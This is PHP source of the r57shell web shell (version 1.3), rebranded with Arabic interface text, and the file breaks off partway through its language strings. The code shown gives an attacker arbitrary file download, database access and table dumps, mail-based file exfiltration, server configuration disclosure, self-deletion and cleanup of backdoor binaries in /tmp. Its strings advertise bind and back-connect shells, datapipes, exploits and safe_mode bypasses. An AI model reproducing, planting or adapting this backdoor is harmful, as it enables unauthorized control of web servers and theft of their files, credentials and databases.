<?php

// ????? ????? | Language
// $language='ru' - ??????? (russian)
// $language='eng' - english (??????????)
$language='eng';
// ?????????????? | Authentification
// $auth = 1; - ?????????????? ????????  ( authentification = On  )
// $auth = 0; - ?????????????? ????????? ( authentification = Off )
$auth = 0;
// ????? ? ?????? ??? ??????? ? ??????? (Login & Password for access)
// ?? ???????? ??????? ????? ??????????? ?? ???????!!! (CHANGE THIS!!!)
// ????? ? ?????? ????????? ? ??????? ????????? md5, ???????? ?? ????????? 'r57'
// Login & password crypted with md5, default is 'r57'
$name='ec371748dc2da624b35a4f8f685dd122'; // ????? ????????????  (user login)
$pass='ec371748dc2da624b35a4f8f685dd122'; // ?????? ???????????? (user password)
/******************************************************************************************************/
error_reporting(0);
set_magic_quotes_runtime(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
$safe_mode = @ini_get('safe_mode');
$version = "1.3";
if(version_compare(phpversion(), '4.1.0') == -1)
 {
 $_POST   = &$HTTP_POST_VARS;
 $_GET    = &$HTTP_GET_VARS;
 $_SERVER = &$HTTP_SERVER_VARS;
 }
if (@get_magic_quotes_gpc())
 {
 foreach ($_POST as $k=>$v)
  {
  $_POST[$k] = stripslashes($v);
  }
 foreach ($_SERVER as $k=>$v)
  {
  $_SERVER[$k] = stripslashes($v);
  }
 }
if($auth == 1) {
if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass)
   {
   header('WWW-Authenticate: Basic realm="r57shell"');
   header('HTTP/1.0 401 Unauthorized');
   exit("<b><a href=http://rst.void.ru>r57shell</a> : Access Denied</b>");
   }
}
$head = '<!-- ??????????  ???? -->
<html>
<head>
<title>WwW.SeCuReDeAtH.cOm</title>
<meta http-equiv="Content-Language" content="ar-sa">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1256">
<STYLE>
tr {
BORDER-RIGHT:  #aaaaaa 1px solid;
BORDER-TOP:    #eeeeee 1px solid;
BORDER-LEFT:   #eeeeee 1px solid;
BORDER-BOTTOM: #aaaaaa 1px solid;
}
td {
BORDER-RIGHT:  #aaaaaa 1px solid;
BORDER-TOP:    #eeeeee 1px solid;
BORDER-LEFT:   #eeeeee 1px solid;
BORDER-BOTTOM: #aaaaaa 1px solid;
}
.table1 {
BORDER-RIGHT:  #cccccc 0px;
BORDER-TOP:    #cccccc 0px;
BORDER-LEFT:   #cccccc 0px;
BORDER-BOTTOM: #cccccc 0px;
BACKGROUND-COLOR: #D4D0C8;
}
.td1 {
BORDER-RIGHT:  #cccccc 0px;
BORDER-TOP:    #cccccc 0px;
BORDER-LEFT:   #cccccc 0px;
BORDER-BOTTOM: #cccccc 0px;
font: 7pt Verdana;
}
.tr1 {
BORDER-RIGHT:  #cccccc 0px;
BORDER-TOP:    #cccccc 0px;
BORDER-LEFT:   #cccccc 0px;
BORDER-BOTTOM: #cccccc 0px;
}
table {
BORDER-RIGHT:  #eeeeee 1px outset;
BORDER-TOP:    #eeeeee 1px outset;
BORDER-LEFT:   #eeeeee 1px outset;
BORDER-BOTTOM: #eeeeee 1px outset;
BACKGROUND-COLOR: #D4D0C8;
}
input {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: 8pt Verdana;
}
select {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: 8pt Verdana;
}
submit {
BORDER-RIGHT:  buttonhighlight 2px outset;
BORDER-TOP:    buttonhighlight 2px outset;
BORDER-LEFT:   buttonhighlight 2px outset;
BORDER-BOTTOM: buttonhighlight 2px outset;
BACKGROUND-COLOR: #e4e0d8;
width: 30%;
}
textarea {
BORDER-RIGHT:  #ffffff 1px solid;
BORDER-TOP:    #999999 1px solid;
BORDER-LEFT:   #999999 1px solid;
BORDER-BOTTOM: #ffffff 1px solid;
BACKGROUND-COLOR: #e4e0d8;
font: Fixedsys bold;
}
BODY {
margin-top: 1px;
margin-right: 1px;
margin-bottom: 1px;
margin-left: 1px;
}
A:link {COLOR:red; TEXT-DECORATION: none}
A:visited { COLOR:red; TEXT-DECORATION: none}
A:active {COLOR:red; TEXT-DECORATION: none}
A:hover {color:blue;TEXT-DECORATION: none}
</STYLE>';
class zipfile
{
    var $datasec      = array();
    var $ctrl_dir     = array();
    var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
    var $old_offset   = 0;
    function unix2DosTime($unixtime = 0) {
        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
        if ($timearray['year'] < 1980) {
            $timearray['year']    = 1980;
            $timearray['mon']     = 1;
            $timearray['mday']    = 1;
            $timearray['hours']   = 0;
            $timearray['minutes'] = 0;
            $timearray['seconds'] = 0;
        }
        return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
                ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
    }
    function addFile($data, $name, $time = 0)
    {
        $name     = str_replace('\\', '/', $name);
        $dtime    = dechex($this->unix2DosTime($time));
        $hexdtime = '\x' . $dtime[6] . $dtime[7]
                  . '\x' . $dtime[4] . $dtime[5]
                  . '\x' . $dtime[2] . $dtime[3]
                  . '\x' . $dtime[0] . $dtime[1];
        eval('$hexdtime = "' . $hexdtime . '";');
        $fr   = "\x50\x4b\x03\x04";
        $fr   .= "\x14\x00";
        $fr   .= "\x00\x00";
        $fr   .= "\x08\x00";
        $fr   .= $hexdtime;
        $unc_len = strlen($data);
        $crc     = crc32($data);
        $zdata   = gzcompress($data);
        $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
        $c_len   = strlen($zdata);
        $fr      .= pack('V', $crc);
        $fr      .= pack('V', $c_len);
        $fr      .= pack('V', $unc_len);
        $fr      .= pack('v', strlen($name));
        $fr      .= pack('v', 0);
        $fr      .= $name;
        $fr .= $zdata;
        $this -> datasec[] = $fr;
        $cdrec = "\x50\x4b\x01\x02";
        $cdrec .= "\x00\x00";
        $cdrec .= "\x14\x00";
        $cdrec .= "\x00\x00";
        $cdrec .= "\x08\x00";
        $cdrec .= $hexdtime;
        $cdrec .= pack('V', $crc);
        $cdrec .= pack('V', $c_len);
        $cdrec .= pack('V', $unc_len);
        $cdrec .= pack('v', strlen($name) );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('v', 0 );
        $cdrec .= pack('V', 32 );
        $cdrec .= pack('V', $this -> old_offset );
        $this -> old_offset += strlen($fr);
        $cdrec .= $name;
        $this -> ctrl_dir[] = $cdrec;
    }
    function file()
    {
        $data    = implode('', $this -> datasec);
        $ctrldir = implode('', $this -> ctrl_dir);
        return
            $data .
            $ctrldir .
            $this -> eof_ctrl_dir .
            pack('v', sizeof($this -> ctrl_dir)) .
            pack('v', sizeof($this -> ctrl_dir)) .
            pack('V', strlen($ctrldir)) .
            pack('V', strlen($data)) .
            "\x00\x00";
    }
}
function compress(&$filename,&$filedump,$compress)
 {
    global $content_encoding;
    global $mime_type;
    if ($compress == 'bzip' && @function_exists('bzcompress'))
     {
        $filename  .= '.bz2';
        $mime_type = 'application/x-bzip2';
        $filedump = bzcompress($filedump);
     }
     else if ($compress == 'gzip' && @function_exists('gzencode'))
     {
        $filename  .= '.gz';
        $content_encoding = 'x-gzip';
        $mime_type = 'application/x-gzip';
        $filedump = gzencode($filedump);
     }
     else if ($compress == 'zip' && @function_exists('gzcompress'))
     {
     	$filename .= '.zip';
        $mime_type = 'application/zip';
        $zipfile = new zipfile();
        $zipfile -> addFile($filedump, substr($filename, 0, -4));
        $filedump = $zipfile -> file();
     }
     else
     {
     	$mime_type = 'application/octet-stream';
     }
 }
function mailattach($to,$from,$subj,$attach)
 {
 $headers  = "From: $from\r\n";
 $headers .= "MIME-Version: 1.0\r\n";
 $headers .= "Content-Type: ".$attach['type'];
 $headers .= "; name=\"".$attach['name']."\"\r\n";
 $headers .= "Content-Transfer-Encoding: base64\r\n\r\n";
 $headers .= chunk_split(base64_encode($attach['content']))."\r\n";
 if(@mail($to,$subj,"",$headers)) { return 1; }
 return 0;
 }
class my_sql
 {
 var $host = 'localhost';
 var $port = '';
 var $user = '';
 var $pass = '';
 var $base = '';
 var $db   = '';
 var $connection;
 var $res;
 var $error;
 var $rows;
 var $columns;
 var $num_rows;
 var $num_fields;
 var $dump;
 function connect()
  {
  	switch($this->db)
     {
  	 case 'MySQL':
  	  if(empty($this->port)) { $this->port = '3306'; }
  	  if(!function_exists('mysql_connect')) return 0;
  	  $this->connection = @mysql_connect($this->host.':'.$this->port,$this->user,$this->pass);
  	  if(is_resource($this->connection)) return 1;
  	 break;
     case 'MSSQL':
      if(empty($this->port)) { $this->port = '1433'; }
  	  if(!function_exists('mssql_connect')) return 0;
  	  $this->connection = @mssql_connect($this->host.','.$this->port,$this->user,$this->pass);
      if($this->connection) return 1;
     break;
     case 'PostgreSQL':
      if(empty($this->port)) { $this->port = '5432'; }
      $str = "host='".$this->host."' port='".$this->port."' user='".$this->user."' password='".$this->pass."' dbname='".$this->base."'";
      if(!function_exists('pg_connect')) return 0;
      $this->connection = @pg_connect($str);
      if(is_resource($this->connection)) return 1;
     break;
     case 'Oracle':
      if(!function_exists('ocilogon')) return 0;
      $this->connection = @ocilogon($this->user, $this->pass, $this->base);
      if(is_resource($this->connection)) return 1;
     break;
     }
    return 0;
  }
 function select_db()
  {
   switch($this->db)
    {
  	case 'MySQL':
  	 if(@mysql_select_db($this->base,$this->connection)) return 1;
    break;
    case 'MSSQL':
  	 if(@mssql_select_db($this->base,$this->connection)) return 1;
    break;
    case 'PostgreSQL':
     return 1;
    break;
    case 'Oracle':
     return 1;
    break;
    }
   return 0;
  }
 function query($query)
  {
   $this->res=$this->error='';
   switch($this->db)
    {
  	case 'MySQL':
     if(false===($this->res=@mysql_query('/*'.chr(0).'*/'.$query,$this->connection)))
      {
      $this->error = @mysql_error($this->connection);
      return 0;
      }
     else if(is_resource($this->res)) { return 1; }
     return 2;
  	break;
    case 'MSSQL':
     if(false===($this->res=@mssql_query($query,$this->connection)))
      {
      $this->error = 'Query error';
      return 0;
      }
      else if(@mssql_num_rows($this->res) > 0) { return 1; }
     return 2;
    break;
    case 'PostgreSQL':
     if(false===($this->res=@pg_query($this->connection,$query)))
      {
      $this->error = @pg_last_error($this->connection);
      return 0;
      }
      else if(@pg_num_rows($this->res) > 0) { return 1; }
     return 2;
    break;
    case 'Oracle':
     if(false===($this->res=@ociparse($this->connection,$query)))
      {
      $this->error = 'Query parse error';
      }
     else
      {
      if(@ociexecute($this->res))
       {
       if(@ocirowcount($this->res) != 0) return 2;
       return 1;
       }
      $error = @ocierror();
      $this->error=$error['message'];
      }
    break;
    }
  return 0;
  }
 function get_result()
  {
   $this->rows=array();
   $this->columns=array();
   $this->num_rows=$this->num_fields=0;
   switch($this->db)
    {
  	case 'MySQL':
  	 $this->num_rows=@mysql_num_rows($this->res);
  	 $this->num_fields=@mysql_num_fields($this->res);
  	 while(false !== ($this->rows[] = @mysql_fetch_assoc($this->res)));
  	 @mysql_free_result($this->res);
  	 if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
    break;
    case 'MSSQL':
  	 $this->num_rows=@mssql_num_rows($this->res);
  	 $this->num_fields=@mssql_num_fields($this->res);
  	 while(false !== ($this->rows[] = @mssql_fetch_assoc($this->res)));
  	 @mssql_free_result($this->res);
  	 if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;};
    break;
    case 'PostgreSQL':
  	 $this->num_rows=@pg_num_rows($this->res);
  	 $this->num_fields=@pg_num_fields($this->res);
  	 while(false !== ($this->rows[] = @pg_fetch_assoc($this->res)));
  	 @pg_free_result($this->res);
  	 if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
    break;
    case 'Oracle':
     $this->num_fields=@ocinumcols($this->res);
     while(false !== ($this->rows[] = @oci_fetch_assoc($this->res))) $this->num_rows++;
     @ocifreestatement($this->res);
     if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;}
    break;
    }
   return 0;
  }
 function dump($table)
  {
   if(empty($table)) return 0;
   $this->dump=array();
   $this->dump[0] = '##';
   $this->dump[1] = '## --------------------------------------- ';
   $this->dump[2] = '##  Created: '.date ("d/m/Y H:i:s");
   $this->dump[3] = '## Database: '.$this->base;
   $this->dump[4] = '##    Table: '.$table;
   $this->dump[5] = '## --------------------------------------- ';
   switch($this->db)
    {
  	case 'MySQL':
  	 $this->dump[0] = '## MySQL dump';
  	 if($this->query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1) return 0;
  	 if(!$this->get_result()) return 0;
  	 $this->dump[] = $this->rows[0]['Create Table'];
     $this->dump[] = '## --------------------------------------- ';
  	 if($this->query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1) return 0;
  	 if(!$this->get_result()) return 0;
  	 for($i=0;$i<$this->num_rows;$i++)
  	  {
      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @mysql_real_escape_string($v);}
  	  $this->dump[] = 'INSERT INTO `'.$table.'` (`'.@implode("`, `", $this->columns).'`) VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
  	  }
    break;
    case 'MSSQL':
     $this->dump[0] = '## MSSQL dump';
     if($this->query('SELECT * FROM '.$table)!=1) return 0;
  	 if(!$this->get_result()) return 0;
  	 for($i=0;$i<$this->num_rows;$i++)
  	  {
      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @addslashes($v);}
  	  $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
  	  }
    break;
    case 'PostgreSQL':
     $this->dump[0] = '## PostgreSQL dump';
     if($this->query('SELECT * FROM '.$table)!=1) return 0;
  	 if(!$this->get_result()) return 0;
  	 for($i=0;$i<$this->num_rows;$i++)
  	  {
      foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @addslashes($v);}
  	  $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');';
  	  }
    break;
    case 'Oracle':
      $this->dump[0] = '## ORACLE dump';
      $this->dump[]  = '## under construction';
    break;
    default:
     return 0;
    break;
    }
   return 1;
  }
 function close()
  {
   switch($this->db)
    {
  	case 'MySQL':
  	 @mysql_close($this->connection);
    break;
    case 'MSSQL':
     @mssql_close($this->connection);
    break;
    case 'PostgreSQL':
     @pg_close($this->connection);
    break;
    case 'Oracle':
     @oci_close($this->connection);
    break;
    }
  }
 function affected_rows()
  {
   switch($this->db)
    {
  	case 'MySQL':
  	 return @mysql_affected_rows($this->res);
    break;
    case 'MSSQL':
     return @mssql_affected_rows($this->res);
    break;
    case 'PostgreSQL':
     return @pg_affected_rows($this->res);
    break;
    case 'Oracle':
     return @ocirowcount($this->res);
    break;
    default:
     return 0;
    break;
    }
  }
 }
if(isset($_GET['img'])&&!empty($_GET['img']))
 {
 $images = array();
 $images[1]='R0lGODlhBwAHAIAAAAAAAP///yH5BAEAAAEALAAAAAAHAAcAAAILjI9pkODnYohUhQIAOw==';
 $images[2]='R0lGODlhBwAHAIAAAAAAAP///yH5BAEAAAEALAAAAAAHAAcAAAILjI+pwA3hnmlJhgIAOw==';
 @ob_clean();
 header("Content-type: image/gif");
 echo base64_decode($images[$_GET['img']]);
 die();
 }
if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']=="download_file" && !empty($_POST['d_name']))
 {
  if(!$file=@fopen($_POST['d_name'],"r")) { echo re($_POST['d_name']); $_POST['cmd']=""; }
  else
   {
    @ob_clean();
    $filename = @basename($_POST['d_name']);
    $filedump = @fread($file,@filesize($_POST['d_name']));
    fclose($file);
    $content_encoding=$mime_type='';
    compress($filename,$filedump,$_POST['compress']);
    if (!empty($content_encoding)) { header('Content-Encoding: ' . $content_encoding); }
    header("Content-type: ".$mime_type);
    header("Content-disposition: attachment; filename=\"".$filename."\";");
    echo $filedump;
    exit();
   }
 }
if(isset($_GET['phpinfo'])) { echo @phpinfo(); echo "<br><div align=center><font face=Verdana size=2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die(); }
if ($_POST['cmd']=="db_query")
 {
 echo $head;
 $sql = new my_sql();
 $sql->db   = $_POST['db'];
 $sql->host = $_POST['db_server'];
 $sql->port = $_POST['db_port'];
 $sql->user = $_POST['mysql_l'];
 $sql->pass = $_POST['mysql_p'];
 $sql->base = $_POST['mysql_db'];
 $querys = @explode(';',$_POST['db_query']);
 if(!$sql->connect()) echo "<div align=center><font face=Verdana size=2 color=red><b>Can't connect to SQL server</b></font></div>";
  else
   {
   if(!empty($sql->base)&&!$sql->select_db()) echo "<div align=center><font face=Verdana size=2 color=red><b>Can't select database</b></font></div>";
   else
    {
    foreach($querys as $num=>$query)
     {
      if(strlen($query)>5)
      {
      echo "<font face=Verdana size=2 color=green><b>Query#".$num." : ".htmlspecialchars($query,ENT_QUOTES)."</b></font><br>";
      switch($sql->query($query))
       {
       case '0':
       echo "<table width=100%><tr><td><font face=Verdana size=2>Error : <b>".$sql->error."</b></font></td></tr></table>";
       break;
       case '1':
       if($sql->get_result())
        {
       	echo "<table width=100%>";
        foreach($sql->columns as $k=>$v) $sql->columns[$k] = htmlspecialchars($v,ENT_QUOTES);
       	$keys = @implode("&nbsp;</b></font></td><td bgcolor=#cccccc><font face=Verdana size=2><b>&nbsp;", $sql->columns);
        echo "<tr><td bgcolor=#cccccc><font face=Verdana size=2><b>&nbsp;".$keys."&nbsp;</b></font></td></tr>";
        for($i=0;$i<$sql->num_rows;$i++)
         {
         foreach($sql->rows[$i] as $k=>$v) $sql->rows[$i][$k] = htmlspecialchars($v,ENT_QUOTES);
         $values = @implode("&nbsp;</font></td><td><font face=Verdana size=2>&nbsp;",$sql->rows[$i]);
         echo '<tr><td><font face=Verdana size=2>&nbsp;'.$values.'&nbsp;</font></td></tr>';
         }
        echo "</table>";
        }
       break;
       case '2':
       $ar = $sql->affected_rows()?($sql->affected_rows()):('0');
       echo "<table width=100%><tr><td><font face=Verdana size=2>affected rows : <b>".$ar."</b></font></td></tr></table><br>";
       break;
       }
      }
     }
    }
   }
 echo "<br><form name=form method=POST>";
 echo in('hidden','db',0,$_POST['db']);
 echo in('hidden','db_server',0,$_POST['db_server']);
 echo in('hidden','db_port',0,$_POST['db_port']);
 echo in('hidden','mysql_l',0,$_POST['mysql_l']);
 echo in('hidden','mysql_p',0,$_POST['mysql_p']);
 echo in('hidden','mysql_db',0,$_POST['mysql_db']);
 echo in('hidden','cmd',0,'db_query');
 echo "<div align=center><textarea cols=65 rows=10 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\nSELECT * FROM user;"))."</textarea><br><input type=submit name=submit value=\" Run SQL query \"></div><br><br>";
 echo "</form>";
 echo "<br><div align=center><font face=Verdana size=2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die();
 }
if(isset($_GET['delete']))
 {
   @unlink(@substr(@strrchr($_SERVER['PHP_SELF'],"/"),1));
 }
if(isset($_GET['tmp']))
 {
   @unlink("/tmp/bdpl");
   @unlink("/tmp/back");
   @unlink("/tmp/bd");
   @unlink("/tmp/bd.c");
   @unlink("/tmp/dp");
   @unlink("/tmp/dpc");
   @unlink("/tmp/dpc.c");
 }
if(isset($_GET['phpini']))
{
echo $head;
function U_value($value)
 {
 if ($value == '') return '<i>no value</i>';
 if (@is_bool($value)) return $value ? 'TRUE' : 'FALSE';
 if ($value === null) return 'NULL';
 if (@is_object($value)) $value = (array) $value;
 if (@is_array($value))
 {
 @ob_start();
 print_r($value);
 $value = @ob_get_contents();
 @ob_end_clean();
 }
 return U_wordwrap((string) $value);
 }
function U_wordwrap($str)
 {
 $str = @wordwrap(@htmlspecialchars($str), 100, '<wbr />', true);
 return @preg_replace('!(&[^;]*)<wbr />([^;]*;)!', '$1$2<wbr />', $str);
 }
if (@function_exists('ini_get_all'))
 {
 $r = '';
 echo '<table width=100%>', '<tr><td bgcolor=#cccccc><font face=Verdana size=2 color=red><div align=center><b>Directive</b></div></font></td><td bgcolor=#cccccc><font face=Verdana size=2 color=red><div align=center><b>Local Value</b></div></font></td><td bgcolor=#cccccc><font face=Verdana size=2 color=red><div align=center><b>Master Value</b></div></font></td></tr>';
 foreach (@ini_get_all() as $key=>$value)
  {
  $r .= '<tr><td>'.ws(3).'<font face=Verdana size=2><b>'.$key.'</b></font></td><td><font face=Verdana size=2><div align=center><b>'.U_value($value['local_value']).'</b></div></font></td><td><font face=Verdana size=2><div align=center><b>'.U_value($value['global_value']).'</b></div></font></td></tr>';
  }
 echo $r;
 echo '</table>';
 }
echo "<br><div align=center><font face=Verdana size=2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
die();
}
if(isset($_GET['cpu']))
 {
   echo $head;
   echo '<table width=100%><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=2 color=red><b>CPU</b></font></div></td></tr></table><table width=100%>';
   $cpuf = @file("cpuinfo");
   if($cpuf)
    {
      $c = @sizeof($cpuf);
      for($i=0;$i<$c;$i++)
        {
          $info = @explode(":",$cpuf[$i]);
          if($info[1]==""){ $info[1]="---"; }
          $r .= '<tr><td>'.ws(3).'<font face=Verdana size=2><b>'.trim($info[0]).'</b></font></td><td><font face=Verdana size=2><div align=center><b>'.trim($info[1]).'</b></div></font></td></tr>';
        }
      echo $r;
    }
   else
    {
      echo '<tr><td>'.ws(3).'<div align=center><font face=Verdana size=2><b> --- </b></font></div></td></tr>';
    }
   echo '</table>';
   echo "<br><div align=center><font face=Verdana size=2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
   die();
 }
if(isset($_GET['mem']))
 {
   echo $head;
   echo '<table width=100%><tr><td bgcolor=#cccccc><div align=center><font face=Verdana size=2 color=red><b>MEMORY</b></font></div></td></tr></table><table width=100%>';
   $memf = @file("meminfo");
   if($memf)
    {
      $c = sizeof($memf);
      for($i=0;$i<$c;$i++)
        {
          $info = explode(":",$memf[$i]);
          if($info[1]==""){ $info[1]="---"; }
          $r .= '<tr><td>'.ws(3).'<font face=Verdana size=2><b>'.trim($info[0]).'</b></font></td><td><font face=Verdana size=2><div align=center><b>'.trim($info[1]).'</b></div></font></td></tr>';
        }
      echo $r;
    }
   else
    {
      echo '<tr><td>'.ws(3).'<div align=center><font face=Verdana size=2><b> --- </b></font></div></td></tr>';
    }
   echo '</table>';
   echo "<br><div align=center><font face=Verdana size=2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>";
   die();
 }
$lang=array(
'ru_text1' =>'??????????? ???????',
'ru_text2' =>'?????????? ?????? ?? ???????',
'ru_text3' =>'????????? ???????',
'ru_text4' =>'??????? ??????????',
'ru_text5' =>'???????? ?????? ?? ??????',
'ru_text6' =>'????????? ????',
'ru_text7' =>'??????',
'ru_text8' =>'???????? ?????',
'ru_butt1' =>'?????????',
'ru_butt2' =>'?????????',
'ru_text9' =>'???????? ????? ? ???????? ??? ? /bin/bash',
'ru_text10'=>'??????? ????',
'ru_text11'=>'?????? ??? ???????',
'ru_butt3' =>'???????',
'ru_text12'=>'back-connect',
'ru_text13'=>'IP-?????',
'ru_text14'=>'????',
'ru_butt4' =>'?????????',
'ru_text15'=>'???????? ?????? ? ?????????? ???????',
'ru_text16'=>'????????????',
'ru_text17'=>'????????? ????',
'ru_text18'=>'????????? ????',
'ru_text19'=>'Exploits',
'ru_text20'=>'????????????',
'ru_text21'=>'????? ???',
'ru_text22'=>'datapipe',
'ru_text23'=>'????????? ????',
'ru_text24'=>'????????? ????',
'ru_text25'=>'????????? ????',
'ru_text26'=>'????????????',
'ru_butt5' =>'?????????',
'ru_text28'=>'?????? ? safe_mode',
'ru_text29'=>'?????? ????????',
'ru_butt6' =>'???????',
'ru_text30'=>'???????? ?????',
'ru_butt7' =>'???????',
'ru_text31'=>'???? ?? ??????',
'ru_text32'=>'?????????? PHP ????',
'ru_text33'=>'???????? ??????????? ?????? ??????????? open_basedir ????? ??????? cURL',
'ru_butt8' =>'?????????',
'ru_text34'=>'???????? ??????????? ?????? ??????????? safe_mode ????? ??????? include',
'ru_text35'=>'???????? ??????????? ?????? ??????????? safe_mode ????? ???????? ????? ? mysql',
'ru_text36'=>'???? . ???????',
'ru_text37'=>'?????',
'ru_text38'=>'??????',
'ru_text39'=>'????',
'ru_text40'=>'???? ??????? ???? ??????',
'ru_butt9' =>'????',
'ru_text41'=>'????????? ? ?????',
'ru_text42'=>'?????????????? ?????',
'ru_text43'=>'????????????? ????',
'ru_butt10'=>'?????????',
'ru_butt11'=>'?????????????',
'ru_text44'=>'?????????????? ????? ??????????! ?????? ?????? ??? ??????!',
'ru_text45'=>'???? ????????',
'ru_text46'=>'???????? phpinfo()',
'ru_text47'=>'???????? ???????? php.ini',
'ru_text48'=>'???????? ????????? ??????',
'ru_text49'=>'???????? ??????? ? ???????',
'ru_text50'=>'?????????? ? ??????????',
'ru_text51'=>'?????????? ? ??????',
'ru_text52'=>'????? ??? ??????',
'ru_text53'=>'?????? ? ?????',
'ru_text54'=>'????? ?????? ? ??????',
'ru_butt12'=>'?????',
'ru_text55'=>'?????? ? ??????',
'ru_text56'=>'?????? ?? ???????',
'ru_text57'=>'???????/??????? ????/??????????',
'ru_text58'=>'???',
'ru_text59'=>'????',
'ru_text60'=>'??????????',
'ru_butt13'=>'???????/???????',
'ru_text61'=>'???? ??????',
'ru_text62'=>'?????????? ???????',
'ru_text63'=>'???? ??????',
'ru_text64'=>'?????????? ???????',
'ru_text65'=>'???????',
'ru_text66'=>'???????',
'ru_text67'=>'Chown/Chgrp/Chmod',
'ru_text68'=>'???????',
'ru_text69'=>'????????1',
'ru_text70'=>'????????2',
'ru_text71'=>"?????? ???????? ???????:\r\n- ??? CHOWN - ??? ?????? ???????????? ??? ??? UID (??????) \r\n- ??? ??????? CHGRP - ??? ?????? ??? GID (??????) \r\n- ??? ??????? CHMOD - ????? ????? ? ???????????? ????????????? (???????? 0777)",
'ru_text72'=>'????? ??? ??????',
'ru_text73'=>'?????? ? ?????',
'ru_text74'=>'?????? ? ??????',
'ru_text75'=>'* ????? ???????????? ?????????? ?????????',
'ru_text76'=>'????? ?????? ? ?????? ? ??????? ??????? find',
'ru_text80'=>'???',
'ru_text81'=>'????',
'ru_text82'=>'???? ??????',
'ru_text83'=>'?????????? SQL ???????',
'ru_text84'=>'SQL ??????',
'ru_text85'=>'???????? ??????????? ?????? ??????????? safe_mode ????? ?????????? ?????? ? MSSQL ???????',
'ru_text86'=>'?????????? ????? ? ???????',
'ru_butt14'=>'???????',
'ru_text87'=>'?????????? ?????? ? ?????????? ftp-???????',
'ru_text88'=>'FTP-??????:????',
'ru_text89'=>'???? ?? ftp ???????',
'ru_text90'=>'????? ????????',
'ru_text91'=>'???????????? ?',
'ru_text92'=>'??? ?????????',
'ru_text93'=>'FTP',
'ru_text94'=>'FTP-????????',
'ru_text95'=>'?????? ?????????????',
'ru_text96'=>'?? ??????? ???????? ?????? ?????????????',
'ru_text97'=>'????????? ??????????: ',
'ru_text98'=>'??????? ???????????: ',
'ru_text99'=>'* ? ???????? ?????? ? ?????? ???????????? ??? ???????????? ?? /etc/passwd',
'ru_text100'=>'???????? ?????? ?? ????????? ??? ??????',
'ru_text101'=>'???????????? ????? ???????????? (user -> resu) ??? ???????????? ? ???????? ??????',
'ru_text102'=>'?????',
'ru_text103'=>'???????? ??????',
'ru_text104'=>'???????? ????? ?? ???????? ????',
'ru_text105'=>'????',
'ru_text106'=>'??',
'ru_text107'=>'????',
'ru_butt15'=>'?????????',
'ru_text108'=>'????? ??????',
'ru_text109'=>'????????',
'ru_text110'=>'??????????',
'ru_text111'=>'SQL-?????? : ????',
'ru_text112'=>'???????? ??????????? ?????? ??????????? safe_mode ????? ????????????? ??????? mb_send_mail',
'ru_text113'=>'???????? ??????????? ?????? ??????????? safe_mode, ???????? ???????? ?????????? ? ?????????????? imap_list',
'ru_text114'=>'???????? ??????????? ?????? ??????????? safe_mode, ???????? ??????????? ????? ? ?????????????? imap_body',
/* --------------------------------------------------------------- */
'eng_text1' =>'ÇáÃãÑ ÇáãØÈÞ',
'eng_text2' =>'ÊäÝíÐ ÃæÇãÑ Úáì ÇáÓíÑÝÑ',
'eng_text3' =>'ÊØÈíÞ ÃãÑ ãÚíä',
'eng_text4' =>'ãäØÞÉ ÇáÚãá',
'eng_text5' =>'ÑÝÚ ãáÝ Åáì ÇáÓíÑÝÑ',
'eng_text6' =>'ÇáãáÝ ÇáãÑÇÏ ÑÝÚå',
'eng_text7' =>'ãáÝÇÊ ãÔåæÑÉ (íÚäí Ãåã ÇáãáÝÇÊ Åáí ÊÍÊÇÌåÇ)åå',
'eng_text8' =>'ÅÎÊÑ ÇáãáÝ',
'eng_butt1' =>'ÊäÝíÐ',
'eng_butt2' =>'ÑÝÚ',
'eng_text9' =>'ÝÊÍ ÈæÑÊ Úáì ÇáÓíÑÝÑ/bin/bash',
'eng_text10'=>'ÇáÈæÑÊ',
'eng_text11'=>'ÈÇÓæÑÏ ÇáæÕæá',
'eng_butt3' =>'ÝÊÍ',
